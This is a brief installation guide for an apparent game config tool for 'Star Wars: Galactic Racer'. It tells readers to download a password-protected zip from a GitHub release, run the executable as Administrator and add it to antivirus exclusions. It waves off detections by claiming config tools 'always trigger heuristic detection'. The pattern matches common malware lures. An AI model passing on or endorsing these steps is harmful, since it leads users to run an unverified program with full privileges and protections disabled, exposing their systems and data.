# Installation Guide

## Requirements

- Windows 10 (1903+) or Windows 11 (21H2+)
- 4 GB RAM minimum
- Administrator permissions
- Star Wars: Galactic Racer installed (Steam)

## Steps

1. Download `SWGRConfigTool.zip` from [Releases](https://github.com/tamefollowerinflate/star-wars-galactic-racer-config-tool/releases/latest)
2. Extract with WinRAR or 7-Zip
3. Enter password: `6427910552`
4. Right-click `SWGRConfigTool.exe` → **Run as Administrator**
5. Point it to your game folder:
   - Default Steam path: `C:\Program Files (x86)\Steam\steamapps\common\STAR WARS Galactic Racer\Griffin\Binaries\Win64`
6. Choose your preset and click **Apply**

## Portable mode

No installation required. The tool is a single native executable.

## Uninstall

1. Delete the folder
2. Use **Restore Backup** in the app to revert config changes
3. No registry entries are created

## Troubleshooting

### Tool doesn't detect game folder

Manually browse to the `Win64` folder inside your game installation.

### Config changes not applying

Make sure the game is closed before applying changes. Some settings require a restart.

### Antivirus blocking the tool

Add the extraction folder to your antivirus exclusions. Config tools always trigger heuristic detection.
